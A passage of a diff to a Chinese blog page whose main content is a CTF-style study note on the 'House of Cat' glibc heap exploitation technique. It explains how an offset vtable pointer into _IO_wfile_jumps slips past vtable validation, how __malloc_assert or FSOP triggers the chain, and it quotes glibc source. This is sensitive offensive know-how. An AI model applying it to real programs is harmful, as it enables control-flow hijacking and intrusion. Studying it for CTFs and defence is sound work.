@@ -1,294 +1,85 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="theme-color" content="#f58f98">
+  <title>【IO_FILE】house of cat | 鷺雨のBlog</title>
+
+  
   <meta name="author" content="Loora1N">
+  
+
+  
+  <meta name="description" content="Blog of Loora1N">
+  
+
+  
+  
   <meta name="keywords" content="">
   
-    <meta name="description" content="House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 _pointer_chk_guard的检测相关的IO函数的调用，转而调用_IO_wfile_jumps中的_IO_wfile_seekoff函数，然后进入到_IO_switch_to_wget_mode函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【IO_FILE】house of cat">
-<meta property="og:url" content="http://loora1n.github.io/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 _pointer_chk_guard的检测相关的IO函数的调用，转而调用_IO_wfile_jumps中的_IO_wfile_seekoff函数，然后进入到_IO_switch_to_wget_mode函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/house_of_cat/image-20221113210513266.png">
-<meta property="article:published_time" content="2022-11-13T13:31:41.578Z">
-<meta property="article:modified_time" content="2022-11-13T13:31:41.578Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/house_of_cat/image-20221113210513266.png">
-  
-  
-  
-  <title>【IO_FILE】house of cat - 鷺雨のBlog</title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
 
+  <meta property="og:title" content="【IO_FILE】house of cat"/>
 
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
+  <meta property="og:site_name" content="鷺雨のBlog"/>
 
   
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <meta property="og:image" content="/favicon.ico"/>
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
-
-
-
-  
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="鷺雨のBlog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
 <body>
-  
+<div class="blog">
+  <div class="content">
 
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">鷺雨のBlog</a>
+    </h1>
+    <p class="site-description"></p>
   </div>
-</nav>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
 
   
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【IO_FILE】house of cat"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
     
+    <h3 class="article-title"><span>【IO_FILE】house of cat</span></h3>
     
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-13 21:31" pubdate>
-          2022年11月13日 晚上
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a target="_blank" href="//2022/11/13/【IO_FILE】house of cat/" rel="bookmark noopener">
+        <time class="entry-date published" datetime="2022-11-13T13:31:41.578Z">
+          2022-11-13
         </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          14k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          114 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
+      </a>
+    </span>
   </div>
 
 
-        
-      </div>
+  
 
+  <div class="article-content">
+    <div class="entry">
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【IO_FILE】house of cat</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，然后进入到</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert<strong>，改vtable为</strong>_IO_wfile_jumps+0x10**）。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，然后进入到</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert<strong>，改vtable为</strong>_IO_wfile_jumps+0x10**）。</p>
 <blockquote>
 <p>本文为对CatF1y大佬提出的IO_FILE调用链的学习，原文链接：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273895.htm#msg_header_h1_0">House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解</a></p>
 </blockquote>
@@ -298,44 +89,44 @@
 <li>能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</li>
 </ul>
 <h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><h4 id="IO-FILE结构及利用"><a href="#IO-FILE结构及利用" class="headerlink" title="IO_FILE结构及利用"></a>IO_FILE结构及利用</h4><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，只不过需要任意地址写任意值直接改掉libc中的stdout结构体），当进入IO流时会根据vtable指针调用相关的IO函数，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p>
-<h4 id="vatable检查"><a href="#vatable检查" class="headerlink" title="vatable检查"></a>vatable检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr -(<span class="hljs-type">uintptr_t</span>)__start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="vatable检查"><a href="#vatable检查" class="headerlink" title="vatable检查"></a>vatable检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>其检查流程为：计算**_IO_vtable 段的长度（section_length)<strong>，用当前虚表指针的地址减去</strong>_IO_vtable 段的开始地址<strong>，如果vtable相对于开始地址的偏移大于等于</strong>section_length<strong>，那么就会进入</strong>_IO_vtable_check<strong>进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入</strong>_IO_vtable_check**函数后会触发<code>abort</code>。</p>
 <p>但同时我们注意到一件事，这里对于vtable的地址检查并非是具体地址，而是一个范围。这样就给了攻击者可操作的空间，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
 <h4 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h4><p>在glibc中存在一个函数<code>_malloc_assert</code>，其中会根据vtable表如<code>_IO_xxx_jumps</code>调用IO等相关函数；该函数最终会根据stderr这个IO结构体进行相关的IO操作</p>
 <p><img src="/img/article/house_of_cat/image-20221113210513266.png" alt="image-20221113210513266"></p>
 <p>代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>         <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>             __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>             file, line,<br>             function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>             assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>[house of kiwi]([【IO_FILE】House of kiwi - 鷺雨のBlog (loora1n.github.io)](<a href="https://loora1n.github.io/2022/10/27/[IO_FILE]House">https://loora1n.github.io/2022/10/27/[IO_FILE]House</a> of kiwi&#x2F;))提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p>
 <blockquote>
 <p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p>
 </blockquote>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>
 
 <p>下面介绍另一种触发house of cat的方式FSOP:</p>
 <p>程序中所有的<code>_IO_FILE </code>结构用<code>_chain</code>连接形成一个单链表，链表的头部则是<code>_IO_list_all</code></p>
 <p>FSOP就是通过劫持<code>_IO_list_all</code>的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，这个函数会根据<code>_IO_list_all</code>刷新链表中的所有文件流，在libc中代码如下，其中会调用vtable中的IO函数_IO_OVERFLOW，根据我们上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  ...<br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>       ...<br>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<br>               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>           &#123;<br>               result = EOF;<br>          &#125;<br>        ...<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>触发条件则是有三种情况</p>
 <blockquote>
 <p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除;__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p>
 </blockquote>
 <h4 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h4><p>在_IO_wfile_jumps结构体中，会根据虚表进行相关的函数调用。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_new_file_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wfile_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wfile_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),<br>  JUMP_INIT(doallocate, _IO_wfile_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>其中_IO_wfile_seekoff函数代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">off64_t</span><br>_IO_wfile_seekoff (FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir, <span class="hljs-type">int</span> mode)<br>&#123;<br>  <span class="hljs-type">off64_t</span> result;<br>  <span class="hljs-type">off64_t</span> delta, new_offset;<br>  <span class="hljs-type">long</span> 